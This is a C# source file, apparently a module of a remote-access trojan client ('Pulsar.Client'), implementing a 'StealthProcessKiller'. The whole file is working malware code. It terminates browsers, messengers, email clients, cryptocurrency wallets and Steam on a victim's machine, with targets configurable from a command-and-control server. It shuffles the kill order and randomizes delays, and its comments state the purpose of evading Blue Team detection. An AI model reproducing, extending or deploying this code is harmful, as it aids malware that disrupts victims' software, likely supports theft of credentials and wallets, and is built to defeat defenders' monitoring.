using System;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;

namespace Pulsar.Client.Modules
{
    /// <summary>
    /// Stealthy Process Terminator
    /// Designed to evade Blue Team detection with randomized, delayed kills.
    /// </summary>
    public static class StealthProcessKiller
    {
        // Target processes (can be customized via C2)
        private static readonly string[] DefaultTargets = {
            // Browsers (spread kills to avoid mass detection)
            "chrome", "firefox", "msedge", "opera", "brave", "vivaldi",
            "chromium", "iexplore", "safari",
            // Messengers
            "telegram", "discord", "slack", "teams", "skype",
            // Email
            "thunderbird", "outlook",
            // Crypto
            "exodus", "electrum", "atomic",
            // Gaming
            "steam",
        };

        /// <summary>
        /// Kill processes with randomized delays to evade mass-kill detection.
        /// </summary>
        /// <param name="targets">Custom targets or null for defaults</param>
        /// <param name="minDelayMs">Minimum delay between kills</param>
        /// <param name="maxDelayMs">Maximum delay between kills</param>
        public static async Task KillStealthyAsync(string[] targets = null, int minDelayMs = 500, int maxDelayMs = 3000)
        {
            var processesToKill = targets ?? DefaultTargets;
            var random = new Random();

            // Shuffle the order to avoid predictable patterns
            Shuffle(processesToKill, random);

            foreach (var target in processesToKill)
            {
                try
                {
                    // Find and kill processes matching this target
                    foreach (var proc in Process.GetProcessesByName(target))
                    {
                        try
                        {
                            // Use WM_CLOSE first (graceful, less suspicious)
                            if (!proc.CloseMainWindow())
                            {
                                // If graceful close fails, wait briefly then force
                                await Task.Delay(random.Next(100, 500));
                                if (!proc.HasExited)
                                {
                                    proc.Kill();
                                }
                            }
                        }
                        catch { }

                        // Small random delay between same-type kills
                        await Task.Delay(random.Next(50, 200));
                    }

                    // Random delay between different process types
                    await Task.Delay(random.Next(minDelayMs, maxDelayMs));
                }
                catch { }
            }
        }

        /// <summary>
        /// Kill only specific processes (for targeted attacks).
        /// </summary>
        public static void KillSingle(string processName)
        {
            try
            {
                foreach (var proc in Process.GetProcessesByName(processName))
                {
                    try
                    {
                        proc.CloseMainWindow();
                        Thread.Sleep(100);
                        if (!proc.HasExited) proc.Kill();
                    }
                    catch { }
                }
            }
            catch { }
        }

        /// <summary>
        /// Fisher-Yates shuffle for randomizing kill order.
        /// </summary>
        private static void Shuffle<T>(T[] array, Random rng)
        {
            int n = array.Length;
            while (n > 1)
            {
                int k = rng.Next(n--);
                T temp = array[n];
                array[n] = array[k];
                array[k] = temp;
            }
        }
    }
}
